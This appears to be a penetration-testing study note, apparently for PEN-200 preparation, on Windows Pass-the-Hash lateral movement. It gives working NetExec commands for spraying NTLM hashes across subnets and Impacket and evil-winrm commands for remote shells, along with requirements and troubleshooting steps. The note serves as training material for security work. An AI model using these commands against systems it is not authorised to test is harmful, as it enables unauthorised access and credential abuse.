# Lateral Movement — Pass-the-Hash

**On Windows you often don't need to crack an NTLM hash — you can authenticate with the hash itself.** Once you've dumped an Administrator/domain-user NTLM hash, test where that identity has access and use an NTLM-capable remote-execution method.

```text
NTLM hash
   ↓
NTLM authentication
   ↓
SMB / WinRM / WMI-capable tooling
   ↓
remote access / code execution
```

> [!important]
> **Pass-the-Hash is NTLM authentication, not Kerberos.** If the path/tool requires Kerberos instead, use [[Overpass-the-Hash]] to turn the NTLM material into Kerberos tickets.

---

## Requirements / mechanics

For PsExec-style PtH remote code execution, expect:

```text
SMB reachable — usually TCP 445
File and Printer Sharing enabled
ADMIN$ share available
Valid NTLM hash for an account with local Administrator rights
```

Many PtH tools authenticate over SMB with the NTLM hash, create/start a Windows service through the **Service Control Manager**, and communicate with the process through **Named Pipes**. If you only need to access an SMB share, a service does not necessarily need to be created.

---

## Validate and spray the hash

```bash
# Local built-in Administrator hash
nxc smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth

# Find every host where it works
nxc smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> \
    --local-auth --continue-on-success | grep "+"

# Domain account
nxc smb 10.10.10.0/24 -d <DOMAIN> -u <USER> -H <NTLM_HASH> \
    --continue-on-success
```

Use `--local-auth` only when testing a **local** account. Do not use it for a domain identity.

---

## Get a shell

```bash
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>
```

Built-in local Administrator example:

```bash
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@<TARGET_IP>
```

See [[AD Lateral Movement — WMI, WinRM, PsExec & DCOM]] for the plaintext/native remote-execution equivalents.

---

## Local-account restriction to remember

PEN-200 highlights the remote-UAC behavior introduced by Microsoft's 2014 credential-protection changes:

```text
Domain account with local admin rights  → PtH can work
Built-in local Administrator            → PtH can work
Other local administrator accounts      → remote PtH is commonly blocked/restricted
```

So a hash being valid does **not** automatically mean that every local admin account can use it remotely.

---

## If PtH fails

Check:

```text
1. Is TCP 445 / WinRM actually reachable?
2. Is this a local hash or a domain hash?
3. Does the identity have local-admin rights on this target?
4. Is ADMIN$ available for PsExec-style execution?
5. Is remote UAC restricting a non-built-in local admin?
6. Does the target/path require Kerberos instead of NTLM?
```

If Kerberos is required, continue with [[Overpass-the-Hash]]. If the host is behind another compromised machine, combine PtH with your [[Active Directory/Pivoting-tunneling/Intro|pivot/tunnel]] rather than assuming direct Kali reachability.
